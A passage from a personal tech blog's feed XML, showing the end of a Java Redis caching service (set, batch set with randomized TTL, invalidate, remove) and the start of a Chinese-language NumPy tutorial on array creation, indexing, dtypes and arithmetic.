class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.isAlive()) &#123;</span><br><span class="line">                template.opsForValue().set(</span><br><span class="line">                        keyPrefix + id.toString(),</span><br><span class="line">                        mapper.writeValueAsString(val),</span><br><span class="line">                        time, unit</span><br><span class="line">                );</span><br><span class="line">                log.debug(<span class="string">&quot;Set cache for key: &#123;&#125;; TTL: &#123;&#125; &#123;&#125;&quot;</span>, keyPrefix + id, time, unit);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                log.warn(<span class="string">&quot;Redis not alive. Skip writing to it.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">            log.warn(<span class="string">&quot;Exception occurs when setting value for redis: &#123;&#125;&quot;</span>,</span><br><span class="line">                    exception.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> &lt;R, ID&gt; <span class="keyword">void</span> <span class="title function_">putInBatch</span><span class="params">(String keyPrefix, List&lt;ID&gt; ids, List&lt;R&gt; values)</span> &#123;</span><br><span class="line">        <span class="type">Random</span> <span class="variable">randomGen</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">assert</span> ids.size() == values.size();</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.isAlive()) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">idx</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (ID id: ids) &#123;</span><br><span class="line">                    <span class="comment">// center: REDIS_DEFAULT_CACHE_TTL</span></span><br><span class="line">                    <span class="comment">// [center - RANGE, center + RANGE]</span></span><br><span class="line">                    <span class="type">long</span> <span class="variable">randomTime</span> <span class="operator">=</span> randomGen.nextLong(<span class="number">2</span> * Cache.REDIS_BATCH_RANDOM_TTL_RANGE)</span><br><span class="line">                            + Cache.REDIS_DEFAULT_CACHE_TTL - Cache.REDIS_BATCH_RANDOM_TTL_RANGE;</span><br><span class="line">                    template.opsForValue().set(</span><br><span class="line">                            keyPrefix + id.toString(),</span><br><span class="line">                            mapper.writeValueAsString(values.get(idx)),</span><br><span class="line">                            randomTime, Cache.REDIS_TTL_UNIT</span><br><span class="line">                    );</span><br><span class="line">                    log.debug(<span class="string">&quot;Set cache for key in batch: &#123;&#125;; TTL: &#123;&#125; &#123;&#125;&quot;</span>,</span><br><span class="line">                            keyPrefix + id, randomTime, Cache.REDIS_TTL_UNIT);</span><br><span class="line">                    ++idx;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                log.warn(<span class="string">&quot;Redis not alive. Skip batch process.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">            log.warn(<span class="string">&quot;Exception occurs when doing batch process for redis: &#123;&#125;&quot;</span>,</span><br><span class="line">                    exception.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> &lt;ID&gt; Boolean <span class="title function_">invalidate</span><span class="params">(String keyPrefix, ID id)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.isAlive()) &#123;</span><br><span class="line">            log.warn(<span class="string">&quot;Redis not alive. Skip invalidating process.&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// return template.delete(key);</span></span><br><span class="line">            <span class="comment">// no delete but set empty value</span></span><br><span class="line">            template.opsForValue().set(</span><br><span class="line">                    keyPrefix + id.toString(), Cache.REDIS_INVALID_VALUE,</span><br><span class="line">                    Cache.REDIS_DEFAULT_CACHE_TTL, Cache.REDIS_TTL_UNIT</span><br><span class="line">            );</span><br><span class="line">            log.debug(<span class="string">&quot;Invalid cache for key: &#123;&#125;; TTL: &#123;&#125; &#123;&#125;&quot;</span>,</span><br><span class="line">                    keyPrefix + id, Cache.REDIS_DEFAULT_CACHE_TTL, Cache.REDIS_TTL_UNIT);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">            log.warn(<span class="string">&quot;Exception occurs when invalidating value from redis: &#123;&#125;&quot;</span>,</span><br><span class="line">                    exception.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Long <span class="title function_">invalidateByKeyPrefix</span><span class="params">(String keyPrefix)</span> &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0L</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Set&lt;String&gt; keys = template.keys(keyPrefix);</span><br><span class="line">            <span class="comment">// if (keys != null) res = template.delete(keys);</span></span><br><span class="line">            <span class="keyword">if</span> (keys != <span class="literal">null</span>) &#123;</span><br><span class="line">                res = keys.size();</span><br><span class="line">                List&lt;String&gt; empties = Collections.nCopies(keys.size(), Cache.REDIS_INVALID_VALUE);</span><br><span class="line">                log.debug(<span class="string">&quot;--- Start invalid cache by key prefix ---&quot;</span>);</span><br><span class="line">                <span class="comment">// tricky point: use empty key prefix</span></span><br><span class="line">                <span class="built_in">this</span>.putInBatch(<span class="string">&quot;&quot;</span>, keys.stream().toList(), empties);</span><br><span class="line">                log.debug(<span class="string">&quot;--- Successfully invalid cache for keys: &#123;&#125; ---&quot;</span>, keys);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">            log.warn(<span class="string">&quot;Exception occurs when invalidateByPrefix: &#123;&#125;&quot;</span>,</span><br><span class="line">                    exception.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> &lt;ID&gt; Boolean <span class="title function_">remove</span><span class="params">(String keyPrefix, ID id)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.isAlive()) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                log.debug(<span class="string">&quot;Remove cache for key: &#123;&#125;&quot;</span>, keyPrefix + id.toString());</span><br><span class="line">                <span class="keyword">return</span> template.delete(keyPrefix + id.toString());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">                log.warn(<span class="string">&quot;Exception occurs when removing cache: &#123;&#125;&quot;</span>,</span><br><span class="line">                        exception.getMessage());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> log.warn(<span class="string">&quot;Redis not alive. Skip removing process.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Chapter-1-基本概念和-CLI-使用&quot;&gt;&lt;a href=&quot;#Chapter-1-基本概念和-CLI-使用&quot; class=&quot;headerlink&quot; title=&quot;Chapter 1. 基本概念和 CLI 使用&quot;&gt;&lt;/a&gt;Chapter 1. 基本概念和 CL</summary>
      
    
    
    
    <category term="technical" scheme="https://blog.sjtuxhw.top/categories/technical/"/>
    
    
    <category term="Programming" scheme="https://blog.sjtuxhw.top/tags/Programming/"/>
    
    <category term="Web" scheme="https://blog.sjtuxhw.top/tags/Web/"/>
    
    <category term="Redis" scheme="https://blog.sjtuxhw.top/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>Python 科学计算入门</title>
    <link href="https://blog.sjtuxhw.top/technical/python-sci-starter/"/>
    <id>https://blog.sjtuxhw.top/technical/python-sci-starter/</id>
    <published>2024-11-03T11:08:13.000Z</published>
    <updated>2024-11-10T11:17:11.085Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0-1-NumPy"><a href="#0-1-NumPy" class="headerlink" title="0.1 NumPy"></a>0.1 NumPy</h2><p><code>Numpy</code> 库是 Python 科学计算的核心。</p><p>Numpy Array 是一个存放相同数据类型的数组（类型 <code>numpy.ndarray</code>），可以使用非负元组（Non-negative tuple）来索引。</p><p>我们称 Rank 为数组的维数，Shape 表示数组的各个维度的大小，使用整型元组表示。</p><h3 id="0-1-1-Array-Creation"><a href="#0-1-1-Array-Creation" class="headerlink" title="0.1.1 Array Creation"></a>0.1.1 Array Creation</h3><p>初始化 Numpy Array 的方法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">a = np.array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a))</span><br><span class="line"><span class="built_in">print</span>(a.shape)</span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">0</span>], a[<span class="number">1</span>], a[<span class="number">2</span>])</span><br><span class="line"><span class="comment"># Reference Modification</span></span><br><span class="line">a[<span class="number">0</span>] = <span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">b = np.array(</span><br><span class="line">    [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">     [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]]</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(b.shape)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(b))</span><br><span class="line"><span class="built_in">print</span>(b[<span class="number">0</span>, <span class="number">0</span>], b[<span class="number">1</span>, <span class="number">0</span>], b[<span class="number">0</span>, <span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>类似 Matlab，提供多种方法创建数组：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">a = np.zeros((<span class="number">2</span>, <span class="number">2</span>))    <span class="comment"># 2x2 0-matrix</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">b = np.ones((<span class="number">3</span>, <span class="number">3</span>))     <span class="comment"># 3x3 1-matrix</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">c = np.eye(<span class="number">2</span>)           <span class="comment"># 2x2 identical matrix</span></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">d = np.full((<span class="number">4</span>, <span class="number">4</span>), <span class="number">5</span>)  <span class="comment"># 4x4 matrix filled with 5</span></span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="comment"># 2x2 matrix filled with uniformed ([0,1]) random value</span></span><br><span class="line">e = np.random.random((<span class="number">2</span>, <span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">f = np.diag((-<span class="number">3</span>, -<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>)) <span class="comment"># 4x4 matrix with -3, -4, 5, 6 on diagonal</span></span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line">g_dup = f</span><br><span class="line">g = f.copy()    <span class="comment"># Copy construction</span></span><br><span class="line">f[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(g_dup, g)</span><br><span class="line"></span><br><span class="line">h = np.linspace(<span class="number">0</span>, <span class="number">13</span>, <span class="number">5</span>)  <span class="comment"># start=0, end(included)=13, num=5</span></span><br><span class="line"><span class="built_in">print</span>(h)</span><br><span class="line"></span><br><span class="line"><span class="comment"># args are similar with range(), but return np.array</span></span><br><span class="line">k = np.arange(<span class="number">4</span>, <span class="number">5</span>, <span class="number">0.1</span>, dtype=<span class="built_in">float</span>)</span><br><span class="line"><span class="built_in">print</span>(k)</span><br></pre></td></tr></table></figure><p>更多创建方法用到再说。</p><h3 id="0-1-2-Array-Indexing"><a href="#0-1-2-Array-Indexing" class="headerlink" title="0.1.2 Array Indexing"></a>0.1.2 Array Indexing</h3><p>索引 Numpy Array 的方法和 Python 原生数组类似：</p><ul><li>整型索引 + slice <code>:</code> 切片；</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">a = np.array(</span><br><span class="line">    [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>],</span><br><span class="line">     [<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>],</span><br><span class="line">     [<span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>]]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use slice in each dimension (!!! Reference but NOT copy construction !!!)</span></span><br><span class="line">b = a[:<span class="number">2</span>, <span class="number">1</span>:<span class="number">3</span>]  <span class="comment"># row: 0-1 (2 not included), column: 1-2</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="comment"># Reference Modification</span></span><br><span class="line">b[<span class="number">0</span>, <span class="number">1</span>] = <span class="number">99</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># We need to copy construct explicitly</span></span><br><span class="line">c = a[:<span class="number">2</span>, <span class="number">1</span>:<span class="number">3</span>].copy()</span><br><span class="line">b[<span class="number">0</span>, <span class="number">1</span>] = <span class="number">88</span></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get by only one axis</span></span><br><span class="line">c = a[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">d = a[<span class="number">0</span>, <span class="number">2</span>] <span class="comment"># row=0, column=2</span></span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure><p>注意引用传递的问题。</p><p>还可以将 整型索引 和 slice 混合使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">a = np.array(</span><br><span class="line">    [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>],</span><br><span class="line">     [<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>],</span><br><span class="line">     [<span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>]]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get the whole row 0 (equivalent to a[0])</span></span><br><span class="line">row_r1 = a[<span class="number">0</span>, :]</span><br><span class="line"><span class="built_in">print</span>(row_r1, row_r1.shape)</span><br><span class="line"><span class="comment"># row 0 (but keep dimension)</span></span><br><span class="line">row_r2 = a[<span class="number">0</span>:<span class="number">1</span>, :]</span><br><span class="line"><span class="built_in">print</span>(row_r2, row_r2.shape)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Same with column</span></span><br><span class="line">col_r1 = a[:, <span class="number">0</span>]</span><br><span class="line">col_r2 = a[:, <span class="number">0</span>:<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(col_r1, col_r1.shape)</span><br><span class="line"><span class="built_in">print</span>(col_r2, col_r2.shape)</span><br></pre></td></tr></table></figure><p>此外，Numpy 还支持：</p><ul><li>整型数组索引 + 布尔数组索引（更类似 Matlab）：仍然是引用传递。需要 <code>copy()</code> 来 copy construct；</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">a = np.array(</span><br><span class="line">    [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">     [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>],</span><br><span class="line">     [<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>],</span><br><span class="line">     [<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>]]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Equivalent to: np.array([ a[0, 0], a[1, 1], a[2, 0] ])</span></span><br><span class="line"><span class="built_in">print</span>(a[[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>], [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>]])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Variable indexing</span></span><br><span class="line">b = np.array([<span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>])</span><br><span class="line"><span class="comment"># Select each row, column: 0, 2, 0, 1, respectively.</span></span><br><span class="line"><span class="built_in">print</span>(a[np.arange(<span class="number">4</span>), b])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Reference modification</span></span><br><span class="line">a[np.arange(<span class="number">4</span>), b] += <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">a = np.array([</span><br><span class="line">    [<span class="number">1</span>, <span class="number">2</span>],</span><br><span class="line">    [<span class="number">3</span>, <span class="number">4</span>],</span><br><span class="line">    [<span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Like Matlab</span></span><br><span class="line">bool_idx = (a &gt; <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(bool_idx)</span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">NOTE:</span> boolean indexing can only construct rank-1 array</span></span><br><span class="line"><span class="built_in">print</span>(a[bool_idx])  <span class="comment"># [3 4 5 6]</span></span><br><span class="line"><span class="built_in">print</span>(a[a &gt; <span class="number">2</span>])</span><br></pre></td></tr></table></figure><h3 id="0-1-3-Data-Types"><a href="#0-1-3-Data-Types" class="headerlink" title="0.1.3 Data Types"></a>0.1.3 Data Types</h3><p>Numpy 中提供来多种数据类型，可以用来构建数组等操作。默认情况下构建 array，在不指定 <code>dtype</code> 参数时，Numpy 会猜测数组的数据类型。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">x = np.array([<span class="number">1</span>, <span class="number">2</span>])</span><br><span class="line"><span class="built_in">print</span>(x.dtype)    <span class="comment"># np.int64</span></span><br><span class="line"></span><br><span class="line">x = np.array([<span class="number">1</span>, <span class="number">2</span>], dtype=np.uint64)</span><br><span class="line"><span class="built_in">print</span>(x.dtype)    <span class="comment"># np.uint64</span></span><br><span class="line"></span><br><span class="line">x = np.array([<span class="number">1.</span>, <span class="number">2.</span>])</span><br><span class="line"><span class="built_in">print</span>(x.dtype)    <span class="comment"># np.float64</span></span><br></pre></td></tr></table></figure><blockquote><p>Python 原生类型，如 <code>int / bool / float / complex / bytes / str / object</code>，分别对应 <code>int_ / bool_ / float64 / complex128 / bytes_ / str_ / object_</code>；</p></blockquote><p>当数据类型比较复杂时（例如结构体数组），我们可以手动创建 <code>dtype</code> 并指定，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dt = np.dtype([</span><br><span class="line">    (<span class="string">&#x27;name&#x27;</span>, np.str_, <span class="number">16</span>),          <span class="comment"># Like database CHAR(16)</span></span><br><span class="line">    (<span class="string">&#x27;grades&#x27;</span>, np.float64, (<span class="number">2</span>,))    <span class="comment"># length=2, rank-1 array</span></span><br><span class="line">])</span><br><span class="line"><span class="built_in">print</span>(dt)    <span class="comment"># &lt; 表示小端序、U 代表 unicode char 数字就是占用的字节</span></span><br><span class="line">x = np.array([(<span class="string">&#x27;Sarah&#x27;</span>, (<span class="number">8.0</span>, <span class="number">7.0</span>)), (<span class="string">&#x27;John&#x27;</span>, (<span class="number">6.0</span>, <span class="number">7.0</span>))], dtype=dt)</span><br><span class="line"><span class="comment"># Get data like dict</span></span><br><span class="line"><span class="built_in">print</span>(x[<span class="number">1</span>][<span class="string">&#x27;grades&#x27;</span>])</span><br></pre></td></tr></table></figure><p>更多类型的使用、<code>dtype</code> 信息，请参见 <a href="https://numpy.org/doc/stable/reference/arrays.dtypes.html">Array DTypes - Numpy Doc</a>；</p><h3 id="0-1-4-Array-Math"><a href="#0-1-4-Array-Math" class="headerlink" title="0.1.4 Array Math"></a>0.1.4 Array Math</h3><p>数组运算，在 Numpy 中也是向量 / 矩阵运算。</p><p>在 Matlab 中，我们知道这些运算可以是向量整体点积/叉积、矩阵整体乘法/取逆、向量矩阵乘法；也可以是 element-wise（逐元素）的运算。</p><p>逐元素的四则运算、开方运算如下（会产生新对象）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">x = np.array([[<span class="number">1</span>,<span class="number">2</span>],[<span class="number">3</span>,<span class="number">4</span>]], dtype=np.float64)</span><br><span class="line">y = np.array([[<span class="number">5</span>,<span class="number">6</span>],[<span class="number">7</span>,<span class="number">8</span>]], dtype=np.float64)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(x + y)</span><br><span class="line"><span class="built_in">print</span>(np.add(x, y))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(x - y)</span><br><span class="line"><span class="built_in">print</span>(np.subtract(x, y))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 和 matlab 不一样，* 符号是 element-wise 的</span></span><br><span class="line"><span class="built_in">print</span>(x * y)</span><br><span class="line"><span class="built_in">print</span>(np.multiply(x, y))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(x / y)</span><br><span class="line"><span class="built_in">print</span>(np.divide(x, y))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(np.sqrt(x))</span><br></pre></td></tr></table></figure><p>向量点积（内积）/ 矩阵整体乘法 / 向量矩阵乘法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># matrices</span></span><br><span class="line">x = np.array([[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>]])</span><br><span class="line">y = np.array([[<span class="number">5</span>, <span class="number">6</span>], [<span class="number">7</span>, <span class="number">8</span>]])</span><br><span class="line"></span><br><span class="line"><span class="comment"># vectors</span></span><br><span class="line">v = np.array([<span class="number">9</span>, <span class="number">10</span>])</span><br><span class="line">w = np.array([<span class="number">11</span>, <span class="number">12</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Inner product of vectors</span></span><br><span class="line"><span class="built_in">print</span>(v.dot(w))</span><br><span class="line"><span class="built_in">print</span>(np.dot(v, w)) <span class="comment"># equivalence</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Matrix / vector product</span></span><br><span class="line"><span class="comment"># They have different answers!</span></span><br><span class="line"><span class="built_in">print</span>(v.dot(x)) <span class="comment"># v is regarded as row vector</span></span><br><span class="line"><span class="built_in">print</span>(x.dot(v)) <span class="comment"># v is regarded as column vector</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Matrix product</span></span><br><span class="line"><span class="built_in">print</span>(x.dot(y))</span><br></pre></td></tr></table></figure><p>我们发现，在 Numpy 中，通过 <code>array()</code> 定义的 <strong><u>rank-1 array 很灵活，既可以作行向量，又可以作列向量</u></strong>。</p><p>也正因如此，我们下面介绍的 <strong><u>转置操作</u></strong> 对 rank-1 array 毫无影响：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">x = np.array([[<span class="number">1</span>,<span class="number">2</span>], [<span class="number">3</span>,<span class="number">4</span>]])</span><br><span class="line"><span class="built_in">print</span>(x)    <span class="comment"># Prints &quot;[[1 2]</span></span><br><span class="line">            <span class="comment">#          [3 4]]&quot;</span></span><br><span class="line"><span class="comment"># 注意：返回引用！</span></span><br><span class="line"><span class="built_in">print</span>(x.T)  <span class="comment"># Prints &quot;[[1 3]</span></span><br><span class="line">            <span class="comment">#          [2 4]]&quot;</span></span><br><span class="line"><span class="comment"># 等价于 x.transpose()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Note that taking the transpose of a rank 1 array does nothing:</span></span><br><span class="line">v = np.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line"><span class="built_in">print</span>(v)    <span class="comment"># Prints &quot;[1 2 3]&quot;</span></span><br><span class="line"><span class="built_in">print</span>(v.T)  <span class="comment"># Prints &quot;[1 2 3]&quot;</span></span><br></pre></td></tr></table></figure><p>此外，除了 element-wise 求和，Numpy 和 Matlab 一样提供了整体求和的方法 <code>sum</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x = np.array([[<span class="number">1</span>,<span class="number">2</span>],[<span class="number">3</span>,<span class="number">4</span>]])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(np.<span class="built_in">sum</span>(x))    <span class="comment"># 默认全部元素求和</span></span><br><span class="line"><span class="built_in">print</span>(np.<span class="built_in">sum</span>(x, axis=<span class="number">0</span>))  <span class="comment"># axis=0 对第一维度（列）求和</span></span><br><span class="line"><span class="built_in">print</span>(np.<span class="built_in">sum</span>(x, axis=<span class="number">1</span>))  <span class="comment"># axis=1 对第二维度（行）求和</span></span><br></pre></td></tr></table></figure><p>更多运算方法用到再说。</p><h3 id="0-1-5-Broadcasting"><a 